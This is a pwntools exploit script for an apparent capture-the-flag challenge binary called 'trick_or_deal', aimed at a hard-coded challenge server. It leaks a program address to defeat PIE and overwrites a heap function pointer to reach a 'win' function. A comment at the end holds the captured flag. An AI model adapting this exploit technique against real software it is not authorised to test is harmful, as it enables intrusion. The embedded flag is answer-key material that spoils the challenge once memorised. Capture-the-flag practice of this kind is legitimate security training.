#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4141 ./trick_or_deal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./trick_or_deal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '159.65.89.199'
port = int(args.PORT or 30705)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *buy
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './glibc/'

io = start()

io.sendlineafter("? ","2")
io.send("a"*8*1)
io.recvuntil("a"*8*1)
exe.address = u64(io.recvline()[:-1].ljust(8,"\x00")) - 0x15e2
print(hex(exe.address))
win = exe.address + 0xeff
# 0x15e2
# win 0xeff
io.sendlineafter("? ","4")

io.sendlineafter("? ","3")
io.sendlineafter(": ","y")

io.sendlineafter("? \x00",str(0x50))

p = 'a'*(0x48)
p+= p64(win)
io.sendafter("? ",p)

io.sendlineafter("? ","1")

# HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}

io.interactive()

